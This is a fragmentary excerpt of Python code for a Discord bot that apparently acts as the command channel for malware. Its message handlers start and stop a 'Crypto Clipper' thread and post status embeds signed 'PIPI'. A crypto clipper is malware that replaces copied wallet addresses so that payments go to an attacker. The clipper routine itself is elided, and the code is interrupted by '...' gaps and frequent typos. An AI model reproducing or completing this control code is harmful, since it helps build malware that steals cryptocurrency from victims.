...
# on message
    ...
    if clipper_stop:
        ...
        embed = discord.Embed(title="🟢 Crypto Clipper sarted!",description=f'```Cryto Clipper h been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
        ...
        await message.delete()
        #.log Removed the message 
        embed = discord.Embed(title="🔴 Hod on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
...
# on message
    ...
    if not clipper_stop:
        ...
        thread.join()
        #.log Stopped Clipper 
        embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clpper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
        ...
        #.log Clipper is not running 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto lipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
